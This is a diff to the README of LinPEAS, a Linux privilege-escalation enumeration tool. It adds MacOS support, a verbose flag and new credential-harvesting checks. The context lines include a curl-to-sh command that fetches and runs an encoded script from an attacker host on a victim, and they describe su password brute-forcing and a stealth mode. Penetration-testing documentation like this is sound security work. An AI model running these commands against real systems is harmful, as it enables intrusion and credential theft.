@@ -1,4 +1,5 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script 
+[![CI-linpeas_prod](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/actions/workflows/CI-linpeas_prod.yml/badge.svg)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/actions/workflows/CI-linpeas_prod.yml)
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
@@ -48,7 +49,9 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
-**Use the parameter `-a` to execute all these checks.**
+## MacPEAS
+
+Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
 
 ## Basic Information
 
@@ -70,10 +73,11 @@ By default linpeas takes around **2 mins** to complete, but It could take from *
 - **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 - **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
+- **-v** (verbose) - Print information about the checks that haven't discovered anything and about the time each check took
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables during the execution so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable.
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -142,9 +146,9 @@ Here you have an old linpe version script in one line, **just copy and paste it*
 
 **The color filtering is not available in the one-liner** (the lists are too big)
 
-This one-liner is deprecated (I am not going to update it more), but it could be useful in some cases so it will remain here:
+This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.
 
-The default file where all the data is recorded is: */tmp/linPE* (you can change it at the beginning of the script)
+The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)
 
 
 ```sh
@@ -213,6 +217,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Apache (Version)
   - [x] PHP cookies
   - [x] Wordpress (Database credentials)
+  - [x] Drupal (Database credentials)
+  - [x] Moodle (Database credentials)
   - [x] Tomcat (Credentials)
   - [x] Mongo (Version, Credentials)
   - [x] Supervisor (Credentials)
@@ -259,6 +265,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] S/Key
   - [x] YubiKey
   - [x] Passwords inside pam.d
+  - [x] FastCGI params
+  - [x] SNMPD
 
 - **Generic Interesting Files**
   - [x] SUID & SGID files
@@ -314,7 +322,6 @@ Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/s
 - Add more checks
 - Mantain updated the list of vulnerable SUID binaries
 - Mantain updated all the blacklists used to color the output
-- Support for MacOS
 
 If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
 
